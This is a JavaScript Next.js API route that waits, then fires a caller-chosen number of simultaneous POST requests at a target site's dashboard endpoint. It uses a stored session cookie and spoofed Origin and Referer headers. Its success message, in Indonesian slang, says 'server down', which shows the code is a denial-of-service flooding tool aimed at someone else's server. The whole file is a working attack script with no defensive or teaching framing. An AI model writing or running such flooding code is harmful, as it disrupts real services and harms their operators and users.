import urlSearchParam from "@/lib/urlSearchParams";

const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

export async function GET(req) {
  const { searchParams } = new URL(req.url);
  const count = parseInt(searchParams.get("count") || "1", 10);

  await sleep(17000);

  const cookie = process.env.UNITOMO_COOKIE || ""; 
  const bodyPayload = new URLSearchParams(urlSearchParam);

  try {
    const tasks = [];
    for (let i = 0; i < count; i++) {
      tasks.push(
        fetch(`${process.env.URL_TARGET}/dashboard/table`, {
          method: "POST",
          headers: {
            Accept: "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            Origin: `${process.env.URL_TARGET}/`,
            Referer: `${process.env.URL_TARGET}/dashboard`,
            "User-Agent": "Hayoo siapa",
            Cookie: cookie,
          },
          body: bodyPayload.toString(),
        }).then(r => r.json())
      );
    }

    const results = await Promise.all(tasks);

    return Response.json({
      success: true,
      message: `Selesai ${results.length} request. Awokwok Server Down`,
    });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
}
